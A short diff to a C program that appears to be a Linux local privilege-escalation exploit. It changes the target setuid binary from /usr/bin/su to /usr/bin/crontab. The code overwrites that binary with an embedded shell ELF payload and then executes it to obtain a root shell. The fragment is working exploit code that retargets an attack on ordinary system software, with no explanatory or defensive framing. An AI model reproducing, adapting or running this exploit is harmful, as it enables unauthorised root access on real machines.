@@ -1281,7 +1281,7 @@ int main(int argc, char **argv)
 
 //        system("cp /bin/cat /tmp/test");
 //        file_size = use_existing_target("/tmp/test");
-        file_size = use_existing_target("/usr/bin/su");
+        file_size = use_existing_target("/usr/bin/crontab");
 	byte_off = 0;
 	desired = (unsigned char *)shell_elf;
 	desired_len = PAYLOAD_LEN;
@@ -1297,6 +1297,6 @@ int main(int argc, char **argv)
 	/* reset scroll region; some terminals home the cursor on \033[r so
 	 * explicitly jump to the last row so PS1 lands below our output */
 	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
-	execve("/usr/bin/su", NULL, NULL);
+	execve("/usr/bin/crontab", NULL, NULL);
 	return ret;
 }
